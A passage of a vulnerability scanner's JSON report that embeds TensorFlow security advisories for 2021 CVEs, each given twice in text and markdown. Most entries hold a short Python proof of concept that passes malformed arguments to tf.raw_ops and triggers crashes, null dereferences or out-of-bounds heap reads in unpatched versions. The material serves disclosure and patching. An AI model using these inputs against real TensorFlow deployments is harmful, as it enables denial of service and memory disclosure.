                "text": "Vulnerability CVE-2021-37671\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37671)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.Map*` and `tf.raw_ops.OrderedMap*` operations:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapPeek(\n  key=tf.constant([8],dtype=tf.int64),\n  indices=[],\n  dtypes=[tf.int32],\n  capacity=8,\n  memory_limit=128)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L222-L248) has a check in place to ensure that `indices` is in ascending order, but does not check that `indices` is not empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [532f5c5a547126c634fefd43bbad1dc6417678ac](https://github.com/tensorflow/tensorflow/commit/532f5c5a547126c634fefd43bbad1dc6417678ac).\n                       \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37671**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37671](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37671)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.Map*` and `tf.raw_ops.OrderedMap*` operations:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MapPeek(\n  key=tf.constant([8],dtype=tf.int64),\n  indices=[],\n  dtypes=[tf.int32],\n  capacity=8,\n  memory_limit=128)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/map_stage_op.cc#L222-L248) has a check in place to ensure that `indices` is in ascending order, but does not check that `indices` is not empty.\n    \n### Patches\nWe have patched the issue in GitHub commit [532f5c5a547126c634fefd43bbad1dc6417678ac](https://github.com/tensorflow/tensorflow/commit/532f5c5a547126c634fefd43bbad1dc6417678ac).\n                       \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37641",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37641"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37641",
              "help": {
                "text": "Vulnerability CVE-2021-37641\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37641)\n### Impact\nIf the arguments to `tf.raw_ops.RaggedGather` don`t determine a valid ragged tensor code can trigger a read from outside of bounds of heap allocated buffers.\n                                                                                                                                                                                                                                                                                          \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedGather(\n  params_nested_splits = [0,0,0],\n  params_dense_values = [1,1],\n  indices = [0,0,9,0,0],\n  OUTPUT_RAGGED_RANK=0)\n```\n\nIn debug mode, the same code triggers a `CHECK` failure.\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/ragged_gather_op.cc#L70) directly reads the first dimension of a tensor shape before checking that said tensor has rank of at least 1 (i.e., it is not a scalar). Furthermore, the implementation does not check that the list given by `params_nested_splits` is not an empty list of tensors.\n\n### Patches\nWe have patched the issue in GitHub commit [a2b743f6017d7b97af1fe49087ae15f0ac634373](https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37641**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37641](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37641)|\n\n### Impact\nIf the arguments to `tf.raw_ops.RaggedGather` don`t determine a valid ragged tensor code can trigger a read from outside of bounds of heap allocated buffers.\n                                                                                                                                                                                                                                                                                          \n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedGather(\n  params_nested_splits = [0,0,0],\n  params_dense_values = [1,1],\n  indices = [0,0,9,0,0],\n  OUTPUT_RAGGED_RANK=0)\n```\n\nIn debug mode, the same code triggers a `CHECK` failure.\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/ragged_gather_op.cc#L70) directly reads the first dimension of a tensor shape before checking that said tensor has rank of at least 1 (i.e., it is not a scalar). Furthermore, the implementation does not check that the list given by `params_nested_splits` is not an empty list of tensors.\n\n### Patches\nWe have patched the issue in GitHub commit [a2b743f6017d7b97af1fe49087ae15f0ac634373](https://github.com/tensorflow/tensorflow/commit/a2b743f6017d7b97af1fe49087ae15f0ac634373).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37677",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37677"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37677",
              "help": {
                "text": "Vulnerability CVE-2021-37677\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37677](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37677)\n### Impact\nThe shape inference code for `tf.raw_ops.Dequantize` has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Dequantize(\n  input_tensor = tf.constant(-10.0, dtype=tf.float32),\n  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),\n  min_range = tf.constant([], shape=[0], dtype=tf.float32),\n  max_range = tf.constant([], shape=[0], dtype=tf.float32),\n  mode  = `MIN_COMBINED`,\n  narrow_range=False,\n  axis=-10,\n  dtype=tf.dtypes.float32)\n```\n\nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/array_ops.cc#L2999-L3014) uses `axis` to select between two different values for `minmax_rank` which is then used to retrieve tensor dimensions. However, code assumes that `axis` can be either `-1` or a value greater than `-1`, with no validation for the other values.\n\n### Patches\nWe have patched the issue in GitHub commit [da857cfa0fde8f79ad0afdbc94e88b5d4bbec764](https://github.com/tensorflow/tensorflow/commit/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37677**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37677](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37677)|\n\n### Impact\nThe shape inference code for `tf.raw_ops.Dequantize` has a vulnerability that could trigger a denial of service via a segfault if an attacker provides invalid arguments:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Dequantize(\n  input_tensor = tf.constant(-10.0, dtype=tf.float32),\n  input_tensor = tf.cast(input_tensor, dtype=tf.quint8),\n  min_range = tf.constant([], shape=[0], dtype=tf.float32),\n  max_range = tf.constant([], shape=[0], dtype=tf.float32),\n  mode  = `MIN_COMBINED`,\n  narrow_range=False,\n  axis=-10,\n  dtype=tf.dtypes.float32)\n```\n\nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/ops/array_ops.cc#L2999-L3014) uses `axis` to select between two different values for `minmax_rank` which is then used to retrieve tensor dimensions. However, code assumes that `axis` can be either `-1` or a value greater than `-1`, with no validation for the other values.\n\n### Patches\nWe have patched the issue in GitHub commit [da857cfa0fde8f79ad0afdbc94e88b5d4bbec764](https://github.com/tensorflow/tensorflow/commit/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37681",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37681"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37681",
              "help": {
                "text": "Vulnerability CVE-2021-37681\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37681)\n### Impact\nThe implementation of SVDF in TFLite is [vulnerable to a null pointer error](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/svdf.cc#L300-L313):\n\n```cc\n  TfLiteTensor* state = GetVariableInput(context, node, kStateTensor);\n  // ...\n  GetTensorData\u003cfloat\u003e(state)\n```\n\nThe [`GetVariableInput` function](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/kernel_util.cc#L115-L119) can return a null pointer but `GetTensorData` assumes that the argument is always a valid tensor.\n\n```cc\nTfLiteTensor* GetVariableInput(TfLiteContext* context, const TfLiteNode* node,\n                               int index) {\n  TfLiteTensor* tensor = GetMutableInput(context, node, index);\n  return tensor-\u003eis_variable ? tensor : nullptr;\n}\n```\n\nFurthermore, because `GetVariableInput` calls [`GetMutableInput`](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/kernel_util.cc#L82-L90) which might return `nullptr`, the `tensor-\u003eis_variable` expression can also trigger a null pointer exception.\n\n### Patches\nWe have patched the issue in GitHub commit [5b048e87e4e55990dae6b547add4dae59f4e1c76](https://github.com/tensorflow/tensorflow/commit/5b048e87e4e55990dae6b547add4dae59f4e1c76).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37681**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37681](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37681)|\n\n### Impact\nThe implementation of SVDF in TFLite is [vulnerable to a null pointer error](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/svdf.cc#L300-L313):\n\n```cc\n  TfLiteTensor* state = GetVariableInput(context, node, kStateTensor);\n  // ...\n  GetTensorData\u003cfloat\u003e(state)\n```\n\nThe [`GetVariableInput` function](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/kernel_util.cc#L115-L119) can return a null pointer but `GetTensorData` assumes that the argument is always a valid tensor.\n\n```cc\nTfLiteTensor* GetVariableInput(TfLiteContext* context, const TfLiteNode* node,\n                               int index) {\n  TfLiteTensor* tensor = GetMutableInput(context, node, index);\n  return tensor-\u003eis_variable ? tensor : nullptr;\n}\n```\n\nFurthermore, because `GetVariableInput` calls [`GetMutableInput`](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/kernel_util.cc#L82-L90) which might return `nullptr`, the `tensor-\u003eis_variable` expression can also trigger a null pointer exception.\n\n### Patches\nWe have patched the issue in GitHub commit [5b048e87e4e55990dae6b547add4dae59f4e1c76](https://github.com/tensorflow/tensorflow/commit/5b048e87e4e55990dae6b547add4dae59f4e1c76).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37661",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37661"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37661",
              "help": {
                "text": "Vulnerability CVE-2021-37661\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37661](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37661)\n### Impact\nAn attacker can cause a denial of service in `boosted_trees_create_quantile_stream_resource` by using negative arguments:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_boosted_trees_ops\nimport numpy as np\n\nv= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])\ngen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(\n  quantile_stream_resource_handle = v.handle,\n  epsilon = [74.82224],\n  num_streams = [-49], \n  max_elements = np.int32(586))\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantile_ops.cc#L96) does not validate that `num_streams` only contains non-negative numbers. In turn, [this results in using this value to allocate memory](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantiles/quantile_stream_resource.h#L31-L40):\n\n```cc\nclass BoostedTreesQuantileStreamResource : public ResourceBase {\n public:\n  BoostedTreesQuantileStreamResource(const float epsilon,\n                                     const int64 max_elements,\n                                     const int64 num_streams)\n      : are_buckets_ready_(false),\n        epsilon_(epsilon),\n        num_streams_(num_streams),\n        max_elements_(max_elements) {\n    streams_.reserve(num_streams_);\n    ...\n  }\n}\n```\n\nHowever, `reserve` receives an unsigned integer so there is an implicit conversion from a negative value to a large positive unsigned. This results in a crash from the standard library.\n\n### Patches\nWe have patched the issue in GitHub commit [8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992](https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37661**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37661](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37661)|\n\n### Impact\nAn attacker can cause a denial of service in `boosted_trees_create_quantile_stream_resource` by using negative arguments:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_boosted_trees_ops\nimport numpy as np\n\nv= tf.Variable([0.0, 0.0, 0.0, 0.0, 0.0])\ngen_boosted_trees_ops.boosted_trees_create_quantile_stream_resource(\n  quantile_stream_resource_handle = v.handle,\n  epsilon = [74.82224],\n  num_streams = [-49], \n  max_elements = np.int32(586))\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantile_ops.cc#L96) does not validate that `num_streams` only contains non-negative numbers. In turn, [this results in using this value to allocate memory](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/boosted_trees/quantiles/quantile_stream_resource.h#L31-L40):\n\n```cc\nclass BoostedTreesQuantileStreamResource : public ResourceBase {\n public:\n  BoostedTreesQuantileStreamResource(const float epsilon,\n                                     const int64 max_elements,\n                                     const int64 num_streams)\n      : are_buckets_ready_(false),\n        epsilon_(epsilon),\n        num_streams_(num_streams),\n        max_elements_(max_elements) {\n    streams_.reserve(num_streams_);\n    ...\n  }\n}\n```\n\nHowever, `reserve` receives an unsigned integer so there is an implicit conversion from a negative value to a large positive unsigned. This results in a crash from the standard library.\n\n### Patches\nWe have patched the issue in GitHub commit [8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992](https://github.com/tensorflow/tensorflow/commit/8a84f7a2b5a2b27ecf88d25bad9ac777cd2f7992).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37654",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37654"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37654",
              "help": {
                "text": "Vulnerability CVE-2021-37654\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37654](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37654)\n### Impact\nAn attacker can trigger a crash via a `CHECK`-fail in debug builds of TensorFlow using `tf.raw_ops.ResourceGather` or a read from outside the bounds of heap allocated data in the same API in a release build:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant(value=[[1,2],[3,4],[5,6]],shape=(3,2),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=10,\n  validate_indices=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L660-L668) does not check that the `batch_dims` value that the user supplies is less than the rank of the input tensor.\n\nSince the implementation uses several for loops over the dimensions of `tensor`, this results in reading data from outside the bounds of heap allocated buffer backing the tensor:\n\n```cc\n    // batch_dims_ = \u003e params.dims() (10 \u003e 2)\n    for (int i = 0; i \u003c batch_dims_; ++i) {\n      result_shape.AddDim(params.dim_size(i));\n    }\n    for (int i = batch_dims_; i \u003c indices.dims(); ++i) {\n      result_shape.AddDim(indices.dim_size(i));\n    }\n    for (int i = batch_dims_ + 1; i \u003c params.dims(); ++i) {\n      result_shape.AddDim(params.dim_size(i));\n    }\n```\n\nIn debug mode, `.dim_size(i)` validates that the argument is less than `.dims()` using a `DCHECK`. But the `DCHECK` is a no-op in release builds.\n\n### Patches\nWe have patched the issue in GitHub commit [bc9c546ce7015c57c2f15c168b3d9201de679a1d](https://github.com/tensorflow/tensorflow/commit/bc9c546ce7015c57c2f15c168b3d9201de679a1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37654**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37654](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37654)|\n\n### Impact\nAn attacker can trigger a crash via a `CHECK`-fail in debug builds of TensorFlow using `tf.raw_ops.ResourceGather` or a read from outside the bounds of heap allocated data in the same API in a release build:\n\n```python\nimport tensorflow as tf\n\ntensor = tf.constant(value=[[1,2],[3,4],[5,6]],shape=(3,2),dtype=tf.uint32)\nv = tf.Variable(tensor)\ntf.raw_ops.ResourceGather(\n  resource=v.handle,\n  indices=[0],\n  dtype=tf.uint32,\n  batch_dims=10,\n  validate_indices=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L660-L668) does not check that the `batch_dims` value that the user supplies is less than the rank of the input tensor.\n\nSince the implementation uses several for loops over the dimensions of `tensor`, this results in reading data from outside the bounds of heap allocated buffer backing the tensor:\n\n```cc\n    // batch_dims_ = \u003e params.dims() (10 \u003e 2)\n    for (int i = 0; i \u003c batch_dims_; ++i) {\n      result_shape.AddDim(params.dim_size(i));\n    }\n    for (int i = batch_dims_; i \u003c indices.dims(); ++i) {\n      result_shape.AddDim(indices.dim_size(i));\n    }\n    for (int i = batch_dims_ + 1; i \u003c params.dims(); ++i) {\n      result_shape.AddDim(params.dim_size(i));\n    }\n```\n\nIn debug mode, `.dim_size(i)` validates that the argument is less than `.dims()` using a `DCHECK`. But the `DCHECK` is a no-op in release builds.\n\n### Patches\nWe have patched the issue in GitHub commit [bc9c546ce7015c57c2f15c168b3d9201de679a1d](https://github.com/tensorflow/tensorflow/commit/bc9c546ce7015c57c2f15c168b3d9201de679a1d).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37655",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37655"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37655",
              "help": {
                "text": "Vulnerability CVE-2021-37655\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37655)\n### Impact\nAn attacker can trigger a read from outside of bounds of heap allocated data by sending invalid arguments to `tf.raw_ops.ResourceScatterUpdate`:\n\n```python\nimport tensorflow as tf\n\nv = tf.Variable([b`vvv`])\ntf.raw_ops.ResourceScatterUpdate(\n  resource=v.handle,\n  indices=[0],\n  updates=[`1`, `2`, `3`, `4`, `5`])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L919-L923) has an incomplete validation of the relationship between the shapes of `indices` and `updates`: instead of checking that the shape of `indices` is a prefix of the shape of `updates` (so that broadcasting can happen), code only checks that the number of elements in these two tensors are in a divisibility relationship.\n\n### Patches \nWe have patched the issue in GitHub commit [01cff3f986259d661103412a20745928c727326f](https://github.com/tensorflow/tensorflow/commit/01cff3f986259d661103412a20745928c727326f).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37655**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37655](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37655)|\n\n### Impact\nAn attacker can trigger a read from outside of bounds of heap allocated data by sending invalid arguments to `tf.raw_ops.ResourceScatterUpdate`:\n\n```python\nimport tensorflow as tf\n\nv = tf.Variable([b`vvv`])\ntf.raw_ops.ResourceScatterUpdate(\n  resource=v.handle,\n  indices=[0],\n  updates=[`1`, `2`, `3`, `4`, `5`])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/resource_variable_ops.cc#L919-L923) has an incomplete validation of the relationship between the shapes of `indices` and `updates`: instead of checking that the shape of `indices` is a prefix of the shape of `updates` (so that broadcasting can happen), code only checks that the number of elements in these two tensors are in a divisibility relationship.\n\n### Patches \nWe have patched the issue in GitHub commit [01cff3f986259d661103412a20745928c727326f](https://github.com/tensorflow/tensorflow/commit/01cff3f986259d661103412a20745928c727326f).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n    \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37650",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37650"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37650",
              "help": {
                "text": "Vulnerability CVE-2021-37650\nSeverity: high\nFixed Version: 2.5.0\nLink: [CVE-2021-37650](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37650)\n### Impact\nThe implementation for `tf.raw_ops.ExperimentalDatasetToTFRecord` and `tf.raw_ops.DatasetToTFRecord` can trigger heap buffer overflow and segmentation fault:\n\n```python\nimport tensorflow as tf\n\ndataset = tf.data.Dataset.range(3)\ndataset = tf.data.experimental.to_variant(dataset)\ntf.raw_ops.ExperimentalDatasetToTFRecord(\n  input_dataset=dataset,\n  filename=`/tmp/output`,\n  compression_type=``)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/f24faa153ad31a4b51578f8181d3aaab77a1ddeb/tensorflow/core/kernels/data/experimental/to_tf_record_op.cc#L93-L102) assumes that all records in the dataset are of string type. However, there is no check for that, and the example given above uses numeric types.\n\n### Patches\nWe have patched the issue in GitHub commit [e0b6e58c328059829c3eb968136f17aa72b6c876](https://github.com/tensorflow/tensorflow/commit/e0b6e58c328059829c3eb968136f17aa72b6c876).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security 